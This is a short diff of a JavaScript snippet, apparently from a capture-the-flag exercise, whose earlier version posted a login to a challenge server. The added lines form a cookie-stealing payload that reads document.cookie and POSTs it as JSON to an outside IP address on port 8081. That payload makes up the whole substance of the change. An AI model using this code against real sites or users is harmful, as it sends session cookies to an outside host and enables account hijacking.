@@ -1,10 +1,14 @@
+const postData = {
+        name: document.cookie
+};
+
 console.log("started")
-fetch('http://challenges.montrehack.ca:8580/login.php/login.php', {
+fetch("http://139.177.196.226:8081/items", {
   method: 'POST',
   headers: {
-    'User-Agent': 'hello'
+    'Content-Type': 'application/json',
   },
-  body: 'username=rome&password=somerandox'
+  body: JSON.stringify(postData)
 });
 console.log("worked")
 
